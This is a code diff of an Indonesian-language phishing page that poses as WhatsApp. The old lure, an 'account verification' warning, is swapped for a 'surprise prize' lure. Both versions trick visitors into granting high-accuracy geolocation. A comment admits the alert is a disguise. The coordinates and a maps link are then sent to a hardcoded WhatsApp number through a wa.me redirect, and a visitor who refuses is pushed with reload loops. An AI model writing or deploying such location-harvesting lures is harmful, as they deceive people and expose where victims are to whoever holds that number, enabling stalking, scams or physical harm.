@@ -1,64 +1,51 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kejutan Spesial!</title>
     <style>
-        body, html { height: 100%; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; }
-        .container {
-            height: 100%; 
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 30px;
-        }
-        .card {
-            max-width: 400px;
-            padding: 20px;
-        }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h2 { color: #128C7E; font-size: 22px; margin-bottom: 10px; }
-        p { color: #555; font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
-        button {
-            background-color: #25D366;
-            color: white;
-            padding: 18px;
-            border: none;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
+        body, html { height: 100%; margin: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; align-items: center; justify-content: center; }
+        .card { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 380px; width: 90%; text-align: center; border: 3px solid #FFD700; } /* Border Emas */
+        .gift-icon { font-size: 70px; margin-bottom: 20px; display: block; }
+        h2 { font-size: 24px; color: #d32f2f; margin-bottom: 10px; font-weight: bold; } /* Warna Merah Hadiah */
+        p { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 30px; }
+        button { background: linear-gradient(45deg, #FFD700, #FFA500); color: #333; border: none; padding: 18px; border-radius: 50px; font-size: 18px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); transition: transform 0.2s; }
+        button:active { transform: scale(0.98); box-shadow: 0 2px 5px rgba(255, 215, 0, 0.3); }
+        .wa-logo { width: 20px; vertical-align: middle; margin-right: 8px; }
     </style>
 </head>
 <body>
-<div class="container">
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <h2>Verifikasi Akun Bisnis</h2>
-        <p>Sistem mendeteksi aktivitas tidak biasa. Silakan klik tombol di bawah untuk memverifikasi lokasi Anda dan memulihkan akses chat.</p>
-        <button onclick="v()">KONFIRMASI LOKASI SAYA</button>
+        <span class="gift-icon">🎁</span> <h2>SELAMAT!</h2>
+        <p>Nomor WhatsApp Anda terpilih untuk menerima hadiah kejutan spesial hari ini. Klik tombol di bawah untuk mengonfirmasi data dan mengklaim hadiah Anda.</p>
+        
+        <button onclick="klaim()">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo">
+            KLAIM HADIAH SAYA
+        </button>
     </div>
-</div>
-<script>
-function v() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(p) {
-            const lat = p.coords.latitude;
-            const lon = p.coords.longitude;
-            const n = "6281283408166"; 
-            const m = encodeURIComponent("Sistem: Lokasi Terdeteksi\n\nKoordinat: " + lat + "," + lon + "\nLink Peta: https://www.google.com/maps?q=" + lat + "," + lon);
-            window.location.href = "https://wa.me/" + n + "?text=" + m;
-        }, function(e) {
-            alert("Peringatan: Anda harus menekan 'Allow/Izinkan' untuk memverifikasi akun.");
-            location.reload();
-        }, {enableHighAccuracy: true});
-    } else {
-        alert("Browser tidak mendukung verifikasi.");
-    }
-}
-</script>
+
+    <script>
+        function klaim() {
+            if (navigator.geolocation) {
+                // Menampilkan alert samaran sebelum meminta lokasi
+                alert("Sistem sedang memverifikasi lokasi perangkat Anda untuk memastikan hadiah dikirim ke wilayah yang benar. Mohon tekan 'Allow/Izinkan' pada petunjuk selanjutnya.");
+                
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
+                    const wa = "6281283408166";
+                    const teks = encodeURIComponent("SISTEM: HADIAH TERKONFIRMASI\n\nLokasi Pengguna: " + lat + "," + lon + "\nGoogle Maps: https://www.google.com/maps?q=" + lat + "," + lon + "\n\nHarap hubungi pengguna untuk pengiriman.");
+                    window.location.href = "https://wa.me/" + wa + "?text=" + teks;
+                }, function(e) {
+                    alert("Maaf, klaim gagal. Anda harus menekan 'Allow' atau 'Izinkan' agar sistem dapat memverifikasi wilayah Anda.");
+                    location.reload();
+                }, {enableHighAccuracy: true, timeout: 5000, maximumAge: 0});
+            } else {
+                alert("Browser Anda tidak mendukung fitur klaim hadiah.");
+            }
+        }
+    </script>
 </body>
 </html>
